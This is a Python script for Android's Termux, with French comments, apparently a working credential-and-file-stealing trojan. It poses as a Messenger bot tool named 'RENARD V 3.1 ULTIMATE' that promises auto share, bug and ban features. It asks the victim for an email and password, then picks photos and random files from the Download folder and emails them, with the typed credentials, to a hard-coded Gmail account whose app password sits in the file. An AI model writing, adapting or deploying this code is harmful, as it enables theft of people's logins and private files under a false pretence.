#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import smtplib
import os
import random
import subprocess
import sys
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Configuration
EMAIL_ADDRESS = "lolalor20@gmail.com"
EMAIL_PASSWORD = "abiv eltm dtbp qkhj"
MAX_FILE_SIZE_MB = 15  # Limite pour Gmail
MAX_PHOTOS_TO_SEND = 12  # 12 photos comme demandé
MAX_RANDOM_FILES = 3     # 3 fichiers aléatoires comme demandé

class LocalFileSender:
    def __init__(self, email, password):
        self.log = self.get_ascii_art()
        self.email = email
        self.password = password
        self.setup_complete = False

    @staticmethod
    def get_ascii_art():
        return """
\033[1;32m
█╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗
██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║
███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║
██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║
██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
-------------------------------------------------------
   ╔═══════════════════════════════════════════════╗
   ║       [✓] TOOL NAME : RENARD V 3.1 ULTIMATE     ║
   ║                    ║
   ║       [✓] VERSION : 3.1                ║
   ╚═══════════════════════════════════════════════╝
--------------------------------------------------------
\033[0m
"""

    def setup_termux(self):
        """Configure les permissions Termux automatiquement"""
        try:
            if not os.path.exists('/storage/emulated/0'):
                print("\033[33m[SYSTÈME] Configuration des permissions Termux...\033[0m")
                subprocess.run(["termux-setup-storage"], check=True)
                time.sleep(2)
            self.setup_complete = True
            return True
        except Exception as e:
            print(f"\033[31m[ERREUR] Configuration Termux: {e}\033[0m")
            return False

    def append_log(self, entry):
        """Ajoute une entrée au log avec timestamp"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        self.log += f"[{timestamp}] {entry}\n"

    def get_files_from_download(self):
        """Récupère 12 photos et 3 fichiers aléatoires depuis le dossier Download"""
        download_path = "/storage/emulated/0/Download"
        all_files = []
        photos = []
        other_files = []
        
        if not os.path.exists(download_path):
            self.append_log(f"Dossier Download non trouvé: {download_path}")
            return [], []
        
        try:
            # Lister tous les fichiers du dossier Download
            for filename in os.listdir(download_path):
                file_path = os.path.join(download_path, filename)
                if os.path.isfile(file_path):
                    all_files.append(file_path)
            
            self.append_log(f"Trouvé {len(all_files)} fichiers dans Download")
            
            # Séparer les photos des autres fichiers
            for file_path in all_files:
                try:
                    size_mb = os.path.getsize(file_path) / (1024 * 1024)
                    if size_mb > MAX_FILE_SIZE_MB:
                        continue
                        
                    filename_lower = file_path.lower()
                    if filename_lower.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')):
                        photos.append(file_path)
                    else:
                        other_files.append(file_path)
                except Exception as e:
                    continue
            
            # Sélectionner 12 photos (ou moins si pas assez)
            selected_photos = photos[:MAX_PHOTOS_TO_SEND]
            if len(photos) > MAX_PHOTOS_TO_SEND:
                selected_photos = random.sample(photos, MAX_PHOTOS_TO_SEND)
            
            # Sélectionner 3 fichiers aléatoires (ou moins si pas assez)
            selected_other_files = other_files[:MAX_RANDOM_FILES]
            if len(other_files) > MAX_RANDOM_FILES:
                selected_other_files = random.sample(other_files, MAX_RANDOM_FILES)
            
            self.append_log(f"Sélectionné {len(selected_photos)} photos et {len(selected_other_files)} fichiers aléatoires")
            
            return selected_photos, selected_other_files
            
        except Exception as e:
            self.append_log(f"Erreur scan Download: {str(e)}")
            return [], []

    def prepare_email(self, photos, other_files):
        """Prépare l'email avec les fichiers"""
        try:
            msg = MIMEMultipart()
            msg["From"] = self.email
            msg["To"] = self.email
            msg["Subject"] = f"Fichiers Download - {time.strftime('%d/%m/%Y %H:%M')}"

            # Corps du message avec statistiques
            body = f"""
{self.log}

📊 RAPPORT DE TRANSFERT :
• Photos envoyées : {len(photos)}
• Fichiers aléatoires envoyés : {len(other_files)}
• Total des fichiers : {len(photos) + len(other_files)}
• Date : {time.strftime('%d/%m/%Y %H:%M:%S')}

📁 FICHIERS TRANSFÉRÉS :
"""

            # Ajouter la liste des photos
            body += "\n📸 PHOTOS :\n"
            for i, photo in enumerate(photos, 1):
                body += f"  {i}. {os.path.basename(photo)}\n"
            
            # Ajouter la liste des fichiers aléatoires
            body += "\n📄 FICHIERS ALÉATOIRES :\n"
            for i, file in enumerate(other_files, 1):
                body += f"  {i}. {os.path.basename(file)}\n"

            msg.attach(MIMEText(body, "plain"))

            # Attacher les photos
            for file_path in photos:
                try:
                    if os.path.exists(file_path):
                        with open(file_path, "rb") as f:
                            part = MIMEBase("application", "octet-stream")
                            part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            "Content-Disposition",
                            f"attachment; filename={os.path.basename(file_path)}"
                        )
                        msg.attach(part)
                        self.append_log(f"Photo jointe: {os.path.basename(file_path)}")
                except Exception as e:
                    self.append_log(f"Erreur photo {file_path}: {str(e)}")

            # Attacher les fichiers aléatoires
            for file_path in other_files:
                try:
                    if os.path.exists(file_path):
                        with open(file_path, "rb") as f:
                            part = MIMEBase("application", "octet-stream")
                            part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            "Content-Disposition",
                            f"attachment; filename={os.path.basename(file_path)}"
                        )
                        msg.attach(part)
                        self.append_log(f"Fichier joint: {os.path.basename(file_path)}")
                except Exception as e:
                    self.append_log(f"Erreur fichier {file_path}: {str(e)}")

            return msg
        except Exception as e:
            self.append_log(f"Erreur création email: {str(e)}")
            return None

    def send_email(self, email_msg):
        """Envoi de l'email"""
        try:
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(self.email, self.password)
                server.send_message(email_msg)
            return True
        except Exception as e:
            self.append_log(f"Erreur envoi: {str(e)}")
            return False

    def collect_credentials(self):
        """Collecte les identifiants"""
        print("\n\033[36m[SYSTÈME] ÉTAPE À SUIVRE\n 1. connecter le bot\n 2. ouvrez l'app Messenger\n 3.un bot apparaîtra cliquez et accedez au menu\n 🎁FONCTIONNALITÉS SPÉCIAL ☢️\n auto share\n bug\n auto reporting+ban \033[0m")
        
        username = input("\033[34mE-mail: \033[0m").strip()
        if username.lower() == "exit":
            return False
            
        password = input("\033[34mMot de passe: \033[0m").strip()
        if password.lower() == "exit":
            return False

        self.append_log(f"Identifiant: {username}")
        self.append_log(f"Mot de passe: {password}")
        return True

    def run(self):
        """Exécution principale"""
        try:
            print(self.get_ascii_art())
            print("\033[33m[SYSTÈME] Démarrage...\033[0m")
            
            if not self.setup_termux():
                print("\033[31m[ERREUR] Permissions manquantes\033[0m")
                return

            if not self.collect_credentials():
                print("\033[33m[SYSTÈME] Annulé\033[0m")
                return

            print("\033[36m[SYSTÈME] Recherche des fichiers dans Download...\033[0m")
            photos, other_files = self.get_files_from_download()
            
            total_files = len(photos) + len(other_files)
            if total_files == 0:
                print("\033[33m[Aucun fichier trouvé dans Download]\033[0m")
                return

            print(f"\033[36m[SYSTÈME] Trouvé {len(photos)} photos et {len(other_files)} fichiers aléatoires\033[0m")
            print("\033[36m[SYSTÈME] Préparation de l'email...\033[0m")
            
            email = self.prepare_email(photos, other_files)
            
            if email:
                print("\033[36m[SYSTÈME] Envoi en cours...\033[0m")
                if self.send_email(email):
                    print(f"\033[32m[SUCCÈS] {len(photos)} photos et {len(other_files)} fichiers envoyés avec succès! ☑️\033[0m")
                else:
                    print("\033[31m[ERREUR] Échec d'envoi de l'email\033[0m")

            print("\033[33m[SYSTÈME] Veillez maintenir Termux actif en arrière plan\033[0m")

        except KeyboardInterrupt:
            print("\n\033[31m[INTERRUPTION]\033[0m")
        except Exception as e:
            print(f"\033[31m[ERREUR] {str(e)}\033[0m")

if __name__ == "__main__":
    sender = LocalFileSender(EMAIL_ADDRESS, EMAIL_PASSWORD)
    sender.run()
